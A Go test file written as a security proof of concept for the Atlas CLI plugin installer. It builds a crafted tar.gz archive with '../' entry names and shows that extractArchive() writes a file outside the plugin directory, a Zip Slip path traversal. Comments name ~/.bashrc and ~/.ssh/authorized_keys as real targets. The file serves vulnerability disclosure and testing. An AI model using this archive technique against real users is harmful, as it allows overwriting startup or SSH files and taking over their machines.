// Copyright 2026 MongoDB Inc
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package plugin

// Security PoC: demonstrates that extractArchive() (plugin_github_asset.go)
// performs no path-traversal containment check on archive entry names before
// writing files to disk. A "plugin" archive downloaded from an attacker-
// controlled or compromised GitHub repository (via `atlas plugin install
// <owner>/<repo>`) can contain an entry such as "../../../../<target file>"
// and extractArchive will happily write outside the intended plugin
// directory, anywhere the CLI process has filesystem permissions.
//
// This test constructs such a malicious archive itself (standing in for a
// hostile GitHub release asset) and drives the exact vulnerable, unexported
// extractArchive() function used by the real `atlas plugin install` command
// path (see install.go -> extractPluginAssetArchiveFile -> extractArchive).

import (
	"archive/tar"
	"compress/gzip"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// buildMaliciousTarGz creates a .tar.gz archive containing one legitimate
// file inside a top-level directory (so getArchivePrefix() strips it exactly
// like a real plugin release archive), plus one malicious entry whose name
// escapes the top-level directory via "../" segments.
func buildMaliciousTarGz(t *testing.T, archivePath string, escapeEntryName string, escapeContent string) {
	t.Helper()

	f, err := os.Create(archivePath)
	require.NoError(t, err)
	defer f.Close()

	gz := gzip.NewWriter(f)
	defer gz.Close()

	tw := tar.NewWriter(gz)
	defer tw.Close()

	// A normal-looking top-level directory, as real plugin archives have
	// (e.g. "atlas-cli-plugin-example-1.0.0/").
	topDir := "atlas-cli-plugin-example-1.0.0/"
	require.NoError(t, tw.WriteHeader(&tar.Header{
		Name:     topDir,
		Typeflag: tar.TypeDir,
		Mode:     0o755,
	}))

	// A legitimate-looking plugin file, so this looks like a real release.
	manifestContent := []byte("name: atlas-cli-plugin-example\n")
	require.NoError(t, tw.WriteHeader(&tar.Header{
		Name: topDir + "manifest.yml",
		Mode: 0o644,
		Size: int64(len(manifestContent)),
	}))
	_, err = tw.Write(manifestContent)
	require.NoError(t, err)

	// The malicious entry, placed at the ARCHIVE ROOT (a sibling of topDir,
	// not nested inside it). This is enough by itself to make
	// getArchivePrefix() see 2 root entries instead of 1 and skip prefix
	// stripping entirely (prefix=""), so the entry name below is used
	// completely verbatim by extractArchive() -- exactly like a real-world
	// malicious release archive whose author simply doesn't bother matching
	// the "single top-level directory" convention for every entry.
	content := []byte(escapeContent)
	require.NoError(t, tw.WriteHeader(&tar.Header{
		Name: escapeEntryName,
		Mode: 0o644,
		Size: int64(len(content)),
	}))
	_, err = tw.Write(content)
	require.NoError(t, err)
}

func TestExtractArchive_ZipSlip_PathTraversal(t *testing.T) {
	tmp := t.TempDir()

	// Where a legitimate plugin extraction is *supposed* to be confined to.
	// Nested a few levels deep, like the real default plugin directory
	// (~/.atlas/atlas-cli-plugins/<owner>@<name>/).
	pluginsRoot := filepath.Join(tmp, "home", "victim", ".atlas", "atlas-cli-plugins")
	pluginDirectoryPath := filepath.Join(pluginsRoot, "attacker@evil-plugin")
	require.NoError(t, os.MkdirAll(pluginDirectoryPath, 0o755))

	// Somewhere completely outside the plugins directory that a victim would
	// not expect `atlas plugin install` to ever touch -- standing in for
	// real high-value targets like ~/.bashrc, ~/.profile, or
	// ~/.ssh/authorized_keys. A generous number of "../" segments guarantees
	// escaping the plugin directory regardless of exactly how many levels of
	// top-level-directory-prefix-stripping extractArchive() performs
	// internally -- the point being demonstrated is containment escape, not
	// a specific traversal depth.
	outsideDir := filepath.Join(tmp, "home", "victim")
	targetFile := filepath.Join(outsideDir, "pwned-by-plugin-install")

	// Since the malicious entry is placed at the archive root (a sibling of
	// the legitimate top-level directory, see buildMaliciousTarGz),
	// getArchivePrefix() will not strip any prefix from it, so this relative
	// path is used by extractArchive() exactly as computed here.
	escapeEntryName, err := filepath.Rel(pluginDirectoryPath, targetFile)
	require.NoError(t, err)
	t.Logf("escape entry name baked into the malicious archive: %q", escapeEntryName)

	archivePath := filepath.Join(tmp, "malicious-plugin-release.tar.gz")
	marker := "this file was written by extractArchive() OUTSIDE the plugin directory\n"
	buildMaliciousTarGz(t, archivePath, escapeEntryName, marker)

	// Sanity check: nothing at the target path yet.
	_, err = os.Stat(targetFile)
	require.True(t, os.IsNotExist(err), "target file must not exist before extraction")

	// Drive the exact, unexported function that the real
	// `atlas plugin install` command path calls after downloading a plugin
	// release archive from GitHub (see extractPluginAssetArchiveFile in
	// plugin_github_asset.go).
	err = extractArchive(context.Background(), archivePath, pluginDirectoryPath)
	require.NoError(t, err, "extractArchive should not error on this malicious archive -- it has no path-traversal check to trigger")

	// The core assertion: the malicious entry escaped pluginDirectoryPath
	// and landed outside it, at a path of the attacker's choosing.
	data, err := os.ReadFile(targetFile)
	require.NoError(t, err, "the file should have been written OUTSIDE the plugin directory -- this IS the vulnerability")
	assert.Equal(t, marker, string(data))

	rel, relErr := filepath.Rel(pluginDirectoryPath, targetFile)
	require.NoError(t, relErr)
	assert.True(t, strings.HasPrefix(rel, ".."), "escaped file must be outside the plugin directory, got relative path %q", rel)

	t.Logf("CONFIRMED path traversal: extractArchive() wrote %q (outside intended plugin directory %q) from a malicious archive entry", targetFile, pluginDirectoryPath)
}
